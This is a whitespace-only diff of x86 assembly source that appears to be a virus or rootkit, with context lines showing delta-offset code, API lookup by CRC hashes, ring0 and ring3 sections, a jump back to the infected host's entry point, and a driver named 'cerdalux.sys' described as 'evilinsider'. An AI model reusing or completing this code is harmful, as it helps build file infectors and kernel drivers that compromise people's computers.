@@ -2120,13 +2120,13 @@ close_section_ring0:
         push    edi
         call    dword ptr [ebx + ring0data.api.ntos.ZwClose.va]
         ret
- 
+
         ; in:
         ;   ebx = module base
         ;   esi = ptr table api crcs
         ;   edi = ptr buffer api addrs
         ; out: nothing
- 
+
 get_apis:
         mov     eax, ebx
         stosd
@@ -2173,13 +2173,13 @@ get_api_addr:
 get_apis_end:
         pop     ebp
         ret
- 
+
         ;--------------------------------------
         ; ring3 code
         ;--------------------------------------
- 
+
 ring3_start:
- 
+
         pushad
         call    getdelta
         @ring3seh_setup_frame <jmp remove_seh>
@@ -2235,7 +2235,7 @@ is_drv_present:
         add     eax, 05F5Fh
         shl     eax, 1
         push    eax
-        call    dword ptr [ebx + ring3data.api.ntdll.ZwEnumerateBootEntries.va]        
+        call    dword ptr [ebx + ring3data.api.ntdll.ZwEnumerateBootEntries.va]
         test    eax, eax
         jz      jmp_to_host
         xor     eax, eax
@@ -2407,11 +2407,11 @@ jmp_to_host:
 host_start_ep   equ $-4
         jmp     eax
 ring3_end:
- 
+
         ;--------------------------------------
         ; some global data
         ;--------------------------------------
- 
+
         drv_aname           db  "cerdalux.sys",0h
         drv_desc            db  "evilinsider",0h
         systemroot          db  "windows"
@@ -2419,7 +2419,7 @@ ring3_end:
         UCSTR               ufpath_ntdll, "\??\C:\Windows\System32\ntdll.dll", 0
         UCSTR               hal_api_uname, "HalInitSystem", 0
         UCSTR               hal_uname, "hal.dll", 0
- 
+
 drvcode_end:
 drv_end:
 end start
